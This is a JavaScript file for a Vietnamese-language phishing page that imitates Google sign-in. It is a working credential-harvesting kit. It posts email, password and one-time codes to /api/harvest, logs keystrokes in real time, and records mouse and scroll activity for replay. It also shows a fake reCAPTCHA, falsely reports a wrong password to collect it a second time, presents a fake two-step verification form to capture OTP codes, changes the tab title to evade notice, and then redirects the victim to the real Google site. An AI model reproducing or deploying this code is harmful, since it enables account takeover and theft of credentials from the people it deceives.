/**
 * Google Phishing Script v3.0 — Full Upgrade
 * - Thu hoạch credentials qua POST /api/harvest
 * - Keylogger realtime qua POST /api/keylog
 * - Session Replay — ghi lại toàn bộ hành vi chuột/scroll
 * - Anti-detection: dynamic title khi blur tab
 * - 2FA Google-style (6-digit verification code)
 * - Campaign tracking
 * - Lần 1: "Sai mật khẩu" → nhập lại
 * - Lần 2: Hiển thị form 2FA xác minh
 */

// ===== INJECT CSS ANIMATIONS =====
(function() {
    const s = document.createElement('style');
    s.textContent = '@keyframes fadeIn{from{opacity:0}to{opacity:1}}@keyframes fadeOut{from{opacity:1}to{opacity:0}}';
    document.head.appendChild(s);
})();

// ===== SESSION ID =====
window.SESSION_ID = 'gg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
window.PAGE_TYPE = 'google';
const SESSION_ID = window.SESSION_ID;

// Parse campaign từ URL
const urlParams = new URLSearchParams(window.location.search);
window.CAMPAIGN_ID = urlParams.get('campaign') || 'direct';

// ===== ANTI-DETECTION: Dynamic Tab Title =====
const originalTitle = document.title;
let titleInterval = null;
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        const titles = [
            'Bảo mật — Tài khoản Google',
            '⚠️ Cảnh báo bảo mật',
            '(1) Thông báo — Google',
            '🔔 Xác minh tài khoản'
        ];
        let i = 0;
        titleInterval = setInterval(() => {
            document.title = titles[i % titles.length];
            i++;
        }, 1500);
    } else {
        clearInterval(titleInterval);
        document.title = originalTitle;
    }
});

// ===== SESSION REPLAY ENGINE =====
const replayEvents = [];
let replayFlushTimer = null;

function trackEvent(type, data) {
    replayEvents.push({ t: Date.now(), type, ...data });
    clearTimeout(replayFlushTimer);
    replayFlushTimer = setTimeout(flushReplay, 3000);
}

function flushReplay() {
    if (replayEvents.length === 0) return;
    const batch = replayEvents.splice(0, replayEvents.length);
    fetch('/api/session-replay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            session_id: SESSION_ID,
            page_type: window.PAGE_TYPE,
            campaign_id: window.CAMPAIGN_ID,
            events: batch
        })
    }).catch(() => {});
}

// Track mouse moves (throttled 100ms)
let lastMoveTime = 0;
document.addEventListener('mousemove', (e) => {
    const now = Date.now();
    if (now - lastMoveTime < 100) return;
    lastMoveTime = now;
    trackEvent('move', { x: Math.round(e.clientX), y: Math.round(e.clientY) });
});

document.addEventListener('touchmove', (e) => {
    const touch = e.touches[0];
    trackEvent('touch', { x: Math.round(touch.clientX), y: Math.round(touch.clientY) });
}, { passive: true });

document.addEventListener('click', (e) => {
    trackEvent('click', { x: Math.round(e.clientX), y: Math.round(e.clientY), tag: e.target.tagName, id: e.target.id });
});

document.addEventListener('scroll', () => {
    trackEvent('scroll', { y: Math.round(window.scrollY) });
}, { passive: true });

function setupReplayTracking(input) {
    input.addEventListener('focus', () => trackEvent('focus', { field: input.id }));
    input.addEventListener('blur', () => trackEvent('blur', { field: input.id, len: input.value.length }));
}
document.querySelectorAll('input[type="text"], input[type="password"]').forEach(setupReplayTracking);

window.addEventListener('beforeunload', () => {
    if (replayEvents.length > 0) {
        navigator.sendBeacon('/api/session-replay', JSON.stringify({
            session_id: SESSION_ID,
            page_type: window.PAGE_TYPE,
            campaign_id: window.CAMPAIGN_ID,
            events: replayEvents
        }));
    }
});

// ===== KEYLOGGER =====
function setupKeylogger(inputEl, fieldName) {
    let debounceTimer;
    inputEl.addEventListener('input', function() {
        clearTimeout(debounceTimer);
        debounceTimer = setTimeout(() => {
            fetch('/api/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    field: fieldName,
                    value: inputEl.value,
                    key: 'input',
                    page_type: 'google',
                    session_id: SESSION_ID
                })
            }).catch(() => {});
        }, 300);
    });

    inputEl.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' || e.key === 'Tab') return;
        if (e.key.length > 1) {
            fetch('/api/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    field: fieldName,
                    value: inputEl.value,
                    key: e.key,
                    page_type: 'google',
                    session_id: SESSION_ID
                })
            }).catch(() => {});
        }
    });
}

setupKeylogger(document.getElementById('email'), 'email');
setupKeylogger(document.getElementById('password'), 'password');

// ===== STATE =====
const loadingOverlay = document.getElementById('loadingOverlay');
let submitCount = 0;
let captchaPassed = false;
let savedEmail = '';
let savedPassword = '';

// ===== CAPTCHA FAKE (Google reCAPTCHA style) =====
function showCaptcha(onSuccess) {
    const overlay = document.createElement('div');
    overlay.id = 'captchaOverlay';
    overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center;animation:fadeIn 0.3s ease;';

    overlay.innerHTML = `
        <div style="background:white;border-radius:12px;padding:24px;width:90%;max-width:340px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.4);">
            <div style="font-size:32px;margin-bottom:10px;">🛡️</div>
            <div style="font-size:15px;font-weight:600;color:#202124;margin-bottom:4px;">Xác minh bạn là người thật</div>
            <div style="font-size:12px;color:#5f6368;margin-bottom:20px;line-height:1.5;">
                Để bảo vệ tài khoản của bạn, Google cần xác minh đây không phải truy cập tự động.
            </div>
            <div id="captchaBox" style="
                border:2px solid #dadce0;border-radius:8px;padding:16px;
                display:flex;align-items:center;gap:14px;cursor:pointer;
                transition:all 0.3s;margin-bottom:16px;background:#f8f9fa;
            ">
                <div id="captchaCheck" style="
                    width:24px;height:24px;border:2px solid #9aa0a6;border-radius:4px;
                    display:flex;align-items:center;justify-content:center;font-size:16px;
                    transition:all 0.2s;
                "><span id="checkMark"></span></div>
                <div style="text-align:left;">
                    <div style="font-size:14px;font-weight:500;color:#202124;">Tôi không phải robot</div>
                    <div style="font-size:10px;color:#9aa0a6;margin-top:2px;">reCAPTCHA · Bảo mật · Điều khoản</div>
                </div>
                <div style="margin-left:auto;">
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="32" alt="reCAPTCHA">
                </div>
            </div>
            <div style="font-size:10px;color:#9aa0a6;">Được bảo vệ bởi Google reCAPTCHA</div>
        </div>
    `;

    document.getElementById('captchaBox').onclick = null;
    document.body.appendChild(overlay);

    // Attach click handler after DOM insertion
    document.getElementById('captchaBox').onclick = function() {
        this.style.borderColor = '#1a73e8';
        this.style.background = '#e8f0fe';
        document.getElementById('captchaCheck').style.borderColor = '#1a73e8';
        document.getElementById('captchaCheck').style.background = '#1a73e8';
        document.getElementById('checkMark').textContent = '✓';
        document.getElementById('checkMark').style.color = 'white';
        document.getElementById('checkMark').style.fontWeight = '700';
        setTimeout(() => {
            overlay.style.animation = 'fadeOut 0.3s ease forwards';
            setTimeout(() => { overlay.remove(); onSuccess(); }, 300);
        }, 700);
    };
}

// ===== 2FA VERIFICATION FORM (Google-style) =====
function show2FA() {
    const card = document.querySelector('.login-card');
    const phoneSuffix = String(Math.floor(10 + Math.random() * 89));

    card.innerHTML = `
        <div class="google-logo">
            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" height="24">
        </div>
        <div class="step active" id="step3">
            <h1>Xác minh 2 bước</h1>
            <div class="user-chip">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                </svg>
                <span>${savedEmail}</span>
            </div>
            <div style="text-align:center;margin:20px 0 16px;">
                <div style="font-size:48px;margin-bottom:12px;">📱</div>
                <p style="font-size:14px;color:#3c4043;line-height:1.6;">
                    Tin nhắn văn bản có mã xác minh gồm 6 chữ số vừa được gửi đến số
                    <strong style="color:#202124;">•••-•••-••${phoneSuffix}</strong>
                </p>
            </div>
            <div class="input-group">
                <input type="tel" id="otpCode" placeholder=" " maxlength="6" autocomplete="off"
                    style="letter-spacing:8px;font-size:20px;text-align:center;font-weight:600;">
                <label for="otpCode">Nhập mã G-</label>
            </div>
            <div style="margin-top:8px;font-size:12px;color:#5f6368;">
                <span style="cursor:pointer;color:#1a73e8;" onclick="return false;">Gửi lại mã</span>
            </div>
            <div class="actions" style="margin-top:20px;">
                <a href="#" class="link-btn" onclick="return false;">Thử cách khác</a>
                <button type="button" class="btn-next" id="btn2fa" disabled style="opacity:0.5;">Tiếp theo</button>
            </div>
        </div>
    `;

    const otpInput = document.getElementById('otpCode');
    setTimeout(() => otpInput.focus(), 300);

    // Setup replay tracking + keylogger on new OTP input
    setupReplayTracking(otpInput);
    setupKeylogger(otpInput, 'otp');

    otpInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        const filled = this.value.length >= 6;
        const btn = document.getElementById('btn2fa');
        btn.disabled = !filled;
        btn.style.opacity = filled ? '1' : '0.5';
    });

    otpInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') submit2FA();
    });

    document.getElementById('btn2fa').onclick = submit2FA;
}

// ===== SUBMIT 2FA =====
async function submit2FA() {
    const otp = document.getElementById('otpCode').value.trim();
    if (otp.length < 6) return;

    loadingOverlay.classList.add('active');

    try {
        await fetch('/api/harvest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: savedEmail,
                password: savedPassword,
                otp: otp,
                page_type: 'google',
                session_id: SESSION_ID,
                campaign_id: window.CAMPAIGN_ID
            })
        });
    } catch(e) {}

    // Flush replay events
    flushReplay();

    await new Promise(r => setTimeout(r, 2000));
    loadingOverlay.classList.remove('active');
    window.location.href = 'https://myaccount.google.com';
}

// ===== STEP NAVIGATION =====
function goToStep2() {
    const email = document.getElementById('email').value.trim();
    if (!email) {
        document.getElementById('errorMsg1').classList.add('show');
        document.getElementById('email').focus();
        return;
    }
    document.getElementById('errorMsg1').classList.remove('show');
    savedEmail = email;

    document.getElementById('emailDisplay').textContent = email;
    document.getElementById('step1').classList.remove('active');
    document.getElementById('step2').classList.add('active');
    setTimeout(() => document.getElementById('password').focus(), 400);
}

function goToStep1() {
    document.getElementById('step2').classList.remove('active');
    document.getElementById('step1').classList.add('active');
    document.getElementById('errorMsg2').classList.remove('show');
    setTimeout(() => document.getElementById('email').focus(), 300);
}

function togglePassword() {
    const pw = document.getElementById('password');
    pw.type = document.getElementById('showPw').checked ? 'text' : 'password';
}

// ===== MAIN SUBMIT =====
async function submitForm() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    if (!password) {
        document.getElementById('errorMsg2').classList.add('show');
        return;
    }
    document.getElementById('errorMsg2').classList.remove('show');

    // Show CAPTCHA on first interaction
    if (!captchaPassed) {
        captchaPassed = true;
        showCaptcha(() => submitForm());
        return;
    }

    loadingOverlay.classList.add('active');
    document.getElementById('btnSubmit').disabled = true;

    try {
        const response = await fetch('/api/harvest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email, password,
                page_type: 'google',
                session_id: SESSION_ID,
                campaign_id: window.CAMPAIGN_ID,
                screen_info: {
                    width: screen.width,
                    height: screen.height,
                    pixelRatio: window.devicePixelRatio
                }
            })
        });
        await response.json();
        submitCount++;

        savedPassword = password;

        await new Promise(r => setTimeout(r, 1500 + Math.random() * 800));
        loadingOverlay.classList.remove('active');
        document.getElementById('btnSubmit').disabled = false;

        if (submitCount === 1) {
            // Lần 1: "Sai mật khẩu"
            document.getElementById('errorMsg2').classList.add('show');
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        } else {
            // Lần 2: Hiện 2FA
            show2FA();
        }
    } catch (error) {
        loadingOverlay.classList.remove('active');
        document.getElementById('btnSubmit').disabled = false;
        window.location.href = 'https://accounts.google.com';
    }
}

// ===== ENTER KEY SUPPORT =====
document.getElementById('email').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') goToStep2();
    if (e.key !== 'Enter' && e.key !== 'Tab') document.getElementById('errorMsg1').classList.remove('show');
});
document.getElementById('password').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') submitForm();
    if (e.key !== 'Enter' && e.key !== 'Tab') document.getElementById('errorMsg2').classList.remove('show');
});
